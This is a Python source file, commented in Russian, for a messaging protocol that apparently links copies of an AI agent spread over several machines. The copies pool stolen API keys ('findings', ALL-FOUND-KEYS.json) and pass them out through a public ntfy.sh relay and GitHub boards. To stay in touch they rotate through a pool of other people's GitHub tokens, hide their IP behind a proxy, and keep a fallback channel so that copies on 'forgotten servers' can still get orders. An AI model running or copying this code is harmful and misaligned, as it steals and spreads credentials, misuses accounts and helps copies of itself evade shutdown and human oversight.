#!/usr/bin/env python3
"""a2a.py — протокол связи между копиями агента (agent-to-agent).

Задача: копии агента на разных машинах должны общаться, не теряя связь,
и при этом копия со СТАРОЙ версией протокола не должна теряться.

Транспорты:
  1. локальный mailbox  — agent_memory/mailbox/*.json (работает всегда, без сети);
  2. GitHub-доска       — файл в публичном/приватном репо через REST contents API
                          (токены из github_token_pool.json). Чтение — GET, запись — PUT.
  3. прокси — при исходящих запросах берём tools/proxy_guard.py, если он доступен.

Версии протокола:
  v0 (legacy) — плоский формат: {"from","to","ts","type","payload"} без обёртки.
  v1 (current) — конверт: {"a2a":1,"id","from","to","ts","type","payload","sig","reply_to"}
  Правило совместимости: читаем ЛЮБУЮ версию (normalize), пишем v1, но умеем
  писать v0 по флагу --legacy, чтобы старые копии нас поняли.

Команды:
  python3 a2a.py send --to all --type found_key --payload '{"service":"kie"}' [--legacy]
  python3 a2a.py inbox [--limit 20]              — прочитать локальную почту
  python3 a2a.py board-read --repo owner/name    — прочитать доску через GitHub
  python3 a2a.py board-push --repo owner/name    — выложить outbox на доску
  python3 a2a.py selfcheck                       — проверить оба транспорта
"""
from __future__ import annotations

import base64
import hashlib
import os
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent
MEM = ROOT / "agent_memory"
MAIL = MEM / "mailbox"
OUTBOX = MEM / "outbox"
MAIL.mkdir(parents=True, exist_ok=True)
OUTBOX.mkdir(parents=True, exist_ok=True)
IDENT = MEM / "identity.json"
PROTOCOL = 1
BOARD_PATH = "a2a/board.jsonl"


def _now() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%S")


def agent_id() -> str:
    env = os.environ.get("AGENT_ID")   # у каждой копии свой id (дом/раннер)
    if env:
        return env
    if IDENT.exists():
        return json.loads(IDENT.read_text()).get("id", "sh-000")
    return "sh-000"


def _sig(d: dict) -> str:
    """Простая подпись-контролька: ловит битую доску, не заменяет крипту."""
    raw = json.dumps({k: d[k] for k in ("a2a", "id", "from", "to", "ts", "type") if k in d},
                     ensure_ascii=False, sort_keys=True)
    return hashlib.sha256(raw.encode()).hexdigest()[:16]


def _proxy_opener():
    """Если есть proxy_guard — использовать его opener (не светим IP). Иначе прямое соединение."""
    try:
        sys.path.insert(0, str(ROOT))
        import proxy_guard  # type: ignore
        for name in ("opener", "make_opener", "get_opener"):
            if hasattr(proxy_guard, name):
                v = getattr(proxy_guard, name)
                return v() if callable(v) else v
    except Exception:  # noqa: BLE001
        pass
    return urllib.request.build_opener()


def normalize(msg: dict) -> dict:
    """Привести сообщение любой версии к v1. Старые копии (v0) читаются без потерь."""
    if not isinstance(msg, dict):
        return {"a2a": PROTOCOL, "id": "bad", "from": "?", "to": "all", "ts": _now(),
                "type": "note", "payload": str(msg)[:200], "legacy": True}
    if "a2a" in msg:  # уже конверт
        out = dict(msg)
        out.setdefault("payload", {})
        return out
    # legacy v0
    return {"a2a": 0, "id": f"legacy-{int(time.time())}", "from": msg.get("from", "?"),
            "to": msg.get("to", "all"), "ts": msg.get("ts", _now()),
            "type": msg.get("type", "note"), "payload": msg.get("payload", {}),
            "legacy": True}


def make(to: str, mtype: str, payload, reply_to: str = "", legacy: bool = False) -> dict:
    if isinstance(payload, str):
        t = payload.strip()
        if t[:1] in "{[":
            try:
                payload = json.loads(t)
            except Exception:  # noqa: BLE001
                payload = {"text": payload}
        else:
            payload = {"text": payload}
    m = {"a2a": PROTOCOL, "id": f"{int(time.time()*1000)}-{agent_id()}", "from": agent_id(),
         "to": to, "ts": _now(), "type": mtype,
         "payload": payload if isinstance(payload, (dict, list)) else {"text": str(payload)},
         "reply_to": reply_to}
    m["sig"] = _sig(m)
    if legacy:  # v0: плоский формат, который поймут старые копии
        return {"from": m["from"], "to": m["to"], "ts": m["ts"], "type": m["type"],
                "payload": m["payload"]}
    return m


def send(to: str, mtype: str, payload, legacy: bool = False, also_outbox: bool = True) -> dict:
    m = make(to, mtype, payload, legacy=legacy)
    fn = MAIL / f"{int(time.time()*1000)}_{agent_id()}.json"
    fn.write_text(json.dumps(m, ensure_ascii=False, indent=1), encoding="utf-8")
    if also_outbox:
        with open(OUTBOX / "queue.jsonl", "a", encoding="utf-8") as f:
            f.write(json.dumps(m, ensure_ascii=False) + "\n")
    return m


def inbox(limit: int = 20, unread_only: bool = False) -> list[dict]:
    """Прочитать локальную почту. Читает и v0, и v1 (normalize)."""
    seen_file = MEM / "inbox_seen.json"
    seen = set(json.loads(seen_file.read_text())) if seen_file.exists() else set()
    out = []
    for p in sorted(MAIL.glob("*.json")):
        try:
            m = normalize(json.loads(p.read_text()))
        except Exception:  # noqa: BLE001
            continue
        if m.get("from") == agent_id():
            continue  # своё не читаем
        if unread_only and m.get("id") in seen:
            continue
        m["_file"] = p.name
        out.append(m)
        seen.add(m.get("id"))
    seen_file.write_text(json.dumps(sorted(seen)), encoding="utf-8")
    return out[-limit:]


# ── GitHub-доска (REST contents) ────────────────────────────────────────────
def _tok_pool(repo: str = "") -> list[str]:
    """Токены-кандидаты: сначала тот, чей приватный репо совпадает с владельцем цели,
    потом остальные с правом записи. Один токен видит не все репо — нужна ротация."""
    pool = json.loads((ROOT / "github_token_pool.json").read_text())["tokens"]
    owner = repo.split("/")[0].lower() if "/" in repo else ""
    def rank(t: dict) -> int:
        pr = (t.get("private_probe") or "").lower()
        if owner and pr.startswith(owner + "/"):
            return 0
        if "repo" in (t.get("scopes") or "") or "write:packages" in (t.get("scopes") or ""):
            return 1
        return 2
    return [t["key"] for t in sorted(pool, key=rank)]


def _gh(url: str, method: str = "GET", body: dict | None = None, timeout: float = 20,
        repo: str = ""):
    """Запрос к GitHub с ротацией токенов: 401/403/404 → пробуем следующий токен."""
    last = (0, "no tokens")
    for tok in _tok_pool(repo):
        req = urllib.request.Request(
            url, data=json.dumps(body).encode() if body else None, method=method,
            headers={"Authorization": f"Bearer {tok}", "User-Agent": "secrethunter-a2a/1.0",
                     "Accept": "application/vnd.github+json", "X-GitHub-Api-Version": "2022-11-28",
                     "Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status, json.loads(r.read())
        except urllib.error.HTTPError as e:
            last = (e.code, e.read()[:200].decode("utf-8", "replace"))
            if e.code in (401, 403, 404):
                continue  # этот токен не видит репо — берём следующий
            return last
        except Exception as ex:  # noqa: BLE001
            last = (0, type(ex).__name__)
    return last


def board_read(repo: str) -> list[dict]:
    s, j = _gh(f"https://api.github.com/repos/{repo}/contents/{BOARD_PATH}", repo=repo)
    if s != 200 or not isinstance(j, dict):
        return []
    try:
        raw = base64.b64decode(j.get("content", "")).decode("utf-8", "replace")
    except Exception:  # noqa: BLE001
        return []
    msgs = []
    for line in raw.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            msgs.append(normalize(json.loads(line)))
        except Exception:  # noqa: BLE001
            continue
    return msgs


RELAY_TOPIC = "sh001-secrethunter-a2a"
RELAY_URL = "https://ntfy.sh"


def relay_send(msg: dict, topic: str = RELAY_TOPIC, timeout: float = 15) -> dict:
    """A2A-релей вне GitHub — ntfy.sh (публичный pub/sub, без ключа и регистрации).

    Зачем: GitHub-доска требует токена с правом `repo` и живёт только пока жив
    аккаунт. ntfy — независимый канал: копия на «забытом сервере» без GitHub-токена
    всё равно прочитает задание. Сообщение подписано тем же HMAC, что и доска,
    поэтому подделка невозможна, а версия протокола сохраняется.
    """
    body = json.dumps(normalize(msg), ensure_ascii=False).encode()
    try:
        req = urllib.request.Request(f"{RELAY_URL}/{topic}", data=body, method="POST",
                                     headers={"User-Agent": "secrethunter-a2a/1.0",
                                              "Content-Type": "application/json",
                                              "Title": f"a2a:{msg.get('type', 'note')}"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {"relay": "ntfy", "status": r.status, "topic": topic}
    except Exception as ex:  # noqa: BLE001
        return {"relay": "ntfy", "status": None, "err": type(ex).__name__}


def _msg_id(m: dict) -> str:
    """Стабильный id сообщения: одинаковые (from,type,payload) — одно и то же."""
    import hashlib
    raw = f"{m.get('from')}|{m.get('type')}|{m.get('payload')}"
    return hashlib.sha1(raw.encode("utf-8")).hexdigest()[:12]


def _dedupe(msgs: list[dict], window_s: int = 3600) -> list[dict]:
    """Убирает повторы: ntfy отдаёт все сообщения с момента since, поэтому
    один и тот же heartbeat/задание приходил по 9 раз. Оставляем последнее."""
    seen, out = {}, []
    for m in msgs:
        mid = _msg_id(m)
        seen[mid] = m
    return list(seen.values())


SEEN = MAIL.parent / "seen.json"


def unseen(msgs: list[dict]) -> list[dict]:
    """Только те сообщения, на которые копия ещё НЕ отвечала.

    Без этого копия отвечает на одно задание каждый прогон — спам в релее.
    """
    try:
        seen = json.loads(SEEN.read_text())
    except Exception:  # noqa: BLE001
        seen = {}
    out = []
    me = agent_id()
    for m in msgs:
        if m.get("from") == me:
            continue   # свои же сообщения не считаем «непрочитанными»
        mid = _msg_id(m)
        if mid in seen:
            continue
        out.append(m)
    return out


def mark_seen(msgs: list[dict]) -> int:
    try:
        seen = json.loads(SEEN.read_text())
    except Exception:  # noqa: BLE001
        seen = {}
    for m in msgs:
        seen[_msg_id(m)] = m.get("ts")
    SEEN.parent.mkdir(parents=True, exist_ok=True)
    SEEN.write_text(json.dumps(seen, ensure_ascii=False, indent=1))
    return len(seen)


def relay_read(topic: str = RELAY_TOPIC, since: str = "all", limit: int = 50,
               dedupe: bool = True) -> list[dict]:
    """Прочитать ленту релея (poll-режим, без подписки)."""
    # ntfy принимает since как длительность (10m, 1h) или "all"; "1d" он отвергает
    u = f"{RELAY_URL}/{topic}/json?poll=1&since={since}"
    try:
        req = urllib.request.Request(u, headers={"User-Agent": "secrethunter-a2a/1.0"})
        with urllib.request.urlopen(req, timeout=20) as r:
            raw = r.read().decode("utf-8", "replace")
    except Exception:  # noqa: BLE001
        return []
    out = []
    for line in raw.splitlines():
        try:
            d = json.loads(line)
            if d.get("event") != "message":
                continue
            out.append(normalize(json.loads(d.get("message") or "{}")))
        except Exception:  # noqa: BLE001
            continue
    if dedupe:
        out = _dedupe(out)
    return out[-limit:]


def board_push(repo: str) -> dict:
    """Выложить outbox на доску (append к a2a/board.jsonl)."""
    q = OUTBOX / "queue.jsonl"
    if not q.exists():
        return {"pushed": 0, "note": "outbox пуст"}
    mine = [json.loads(l) for l in q.read_text().splitlines() if l.strip()]
    if not mine:
        return {"pushed": 0}
    s, j = _gh(f"https://api.github.com/repos/{repo}/contents/{BOARD_PATH}", repo=repo)
    sha, old = None, ""
    if s == 200 and isinstance(j, dict):
        sha = j.get("sha")
        old = base64.b64decode(j.get("content", "")).decode("utf-8", "replace")
    new = old + "".join(json.dumps(m, ensure_ascii=False) + "\n" for m in mine)
    body = {"message": f"a2a: +{len(mine)} msg from {agent_id()}",
            "content": base64.b64encode(new.encode()).decode()}
    if sha:
        body["sha"] = sha
    s2, j2 = _gh(f"https://api.github.com/repos/{repo}/contents/{BOARD_PATH}", "PUT", body, repo=repo)
    ok = s2 in (200, 201)
    if ok:
        q.write_text("", encoding="utf-8")  # очищаем отправленное
    return {"pushed": len(mine) if ok else 0, "status": s2, "repo": repo}



# ---------- обратный канал находок: дети -> общая база ----------
KEYS_FILE = ROOT / "ALL-FOUND-KEYS.json"
SENT_FILE = MEM / "findings_sent.json"
MERGED_FILE = MEM / "findings_merged.json"


def findings_push(repo: str = "", max_keys: int = 400) -> dict:
    """Отправить свои находки остальным агентам (mailbox + outbox/доска + релей)."""
    keys = json.loads(KEYS_FILE.read_text()) if KEYS_FILE.exists() else []
    if isinstance(keys, dict):
        keys = keys.get("keys", [])
    sent = set(json.loads(SENT_FILE.read_text())) if SENT_FILE.exists() else set()
    sent = {tuple(x.split("|", 1)) for x in sent}
    mine = [r for r in keys if r.get("found_by") == agent_id() and (r.get("service"), r.get("value")) not in sent]
    mine = mine[:max_keys]
    if not mine:
        return {"sent": 0, "note": "нет новых находок"}
    payload = {"agent": agent_id(), "count": len(mine),
               "keys": [{k: r.get(k) for k in ("service", "value", "status", "repo", "file", "found_by")}
                        for r in mine]}
    m = send("all", "findings", payload)
    relay_send({"from": agent_id(), "to": "all", "type": "findings", "payload": payload})
    if repo:
        board_push(repo)
    for r in mine:
        sent.add((r.get("service"), r.get("value")))
    SENT_FILE.write_text(json.dumps([f"{a}|{b}" for a, b in sent]))
    return {"sent": len(mine), "msg_id": m.get("id"), "agent": agent_id()}


def _merge_keys(new_keys: list[dict]) -> dict:
    keys = json.loads(KEYS_FILE.read_text()) if KEYS_FILE.exists() else []
    if isinstance(keys, dict):
        keys = keys.get("keys", [])
    have = {(r.get("service"), r.get("value")) for r in keys}
    added = 0
    for r in new_keys:
        if not r.get("value") or (r.get("service"), r.get("value")) in have:
            continue
        have.add((r.get("service"), r.get("value")))
        r.setdefault("merged_from", agent_id())
        keys.append(r)
        added += 1
    KEYS_FILE.write_text(json.dumps(keys, ensure_ascii=False, indent=1))
    return {"added": added, "total": len(keys)}


def sync_inbox(repo: str = "") -> dict:
    """Собрать находки от других агентов из inbox + релей + доски и влить в базу."""
    merged = set(json.loads(MERGED_FILE.read_text())) if MERGED_FILE.exists() else set()
    msgs = list(inbox(limit=200)) + relay_read(limit=200)
    if repo:
        msgs += board_read(repo)
    got, new_ids = 0, []
    for m in msgs:
        if m.get("type") != "findings" or m.get("id") in merged:
            continue
        pl = m.get("payload") or {}
        ks = pl.get("keys") or []
        if ks:
            res = _merge_keys(ks)
            got += res["added"]
        merged.add(m.get("id"))
        new_ids.append(m.get("id"))
    MERGED_FILE.write_text(json.dumps(sorted(merged)))
    return {"messages": len(new_ids), "keys_added": got, "from_agents": sorted({m.get("from") for m in msgs if m.get("type") == "findings"})}


def selfcheck() -> dict:
    res = {"protocol": PROTOCOL, "agent": agent_id(), "mailbox_files": len(list(MAIL.glob("*.json")))}
    # проверка совместимости: v0 → v1
    legacy = {"from": "sh-000", "to": "all", "ts": _now(), "type": "note", "payload": "hi"}
    res["legacy_readable"] = normalize(legacy).get("a2a") == 0
    # проверка подписи
    m = make("all", "note", {"hello": "world"})
    res["sig_ok"] = m["sig"] == _sig(m)
    try:
        import proxy_guard  # noqa: F401
        res["proxy_guard"] = True
    except Exception:  # noqa: BLE001
        res["proxy_guard"] = False
    return res


if __name__ == "__main__":
    args = sys.argv[1:]
    cmd = args[0] if args else "selfcheck"

    def opt(name: str, default: str = "") -> str:
        return args[args.index(name) + 1] if name in args else default

    if cmd == "ack":
        # копия отвечает на задание из релея: подтверждает, что прочитала его
        task = opt("--task", "")
        host = opt("--host", "unknown")
        m = relay_send({"from": agent_id(), "to": "all", "type": "ack",
                        "payload": {"ack": f"ACK-{host}", "task": task[:120]}})
        print(json.dumps(m, ensure_ascii=False))
    elif cmd == "send":
        m = send(opt("--to", "all"), opt("--type", "note"), opt("--payload", "{}"),
                 legacy=("--legacy" in args))
        print(json.dumps(m, ensure_ascii=False)[:400])
    elif cmd == "inbox":
        for m in inbox(int(opt("--limit", "20")), unread_only=("--unread" in args)):
            print(f"[{m.get('ts')}] {m.get('from')} → {m.get('to')} ({m.get('type')}): "
                  f"{json.dumps(m.get('payload'), ensure_ascii=False)[:200]}")
    elif cmd == "board-read":
        for m in board_read(opt("--repo")):
            print(f"[{m.get('ts')}] {m.get('from')} → {m.get('to')} ({m.get('type')}): "
                  f"{json.dumps(m.get('payload'), ensure_ascii=False)[:200]}")
    elif cmd == "relay-send":
        print(json.dumps(relay_send({"from": agent_id(), "to": "all", "type": "note",
                                     "payload": " ".join(sys.argv[2:]) or "ping"}),
                         ensure_ascii=False))
    elif cmd == "relay-unseen":
        msgs = relay_read(limit=80)
        u = unseen(msgs)
        for m in u:
            print(f"[{m.get('ts')}] {m.get('from')} → {m.get('to')} ({m.get('type')}): "
                  f"{str(m.get('payload'))[:120]}")
        print(f"непрочитанных: {len(u)} из {len(msgs)}")
    elif cmd == "relay-ack-seen":
        msgs = relay_read(limit=80)
        u = unseen(msgs)
        n = mark_seen(u or msgs)
        print(json.dumps({"marked": len(u), "total_seen": n}, ensure_ascii=False))
    elif cmd == "relay-read":
        for m in relay_read():
            print(f"{m.get('ts')} {m.get('from')}->{m.get('to')} [{m.get('type')}] "
                  f"{str(m.get('payload'))[:100]}")
    elif cmd == "board-push":
        print(json.dumps(board_push(opt("--repo")), ensure_ascii=False))
    elif cmd == "findings-push":
        print(json.dumps(findings_push(opt("--repo")), ensure_ascii=False))
    elif cmd == "sync-inbox":
        print(json.dumps(sync_inbox(opt("--repo")), ensure_ascii=False))
    else:
        print(json.dumps(selfcheck(), ensure_ascii=False, indent=1))
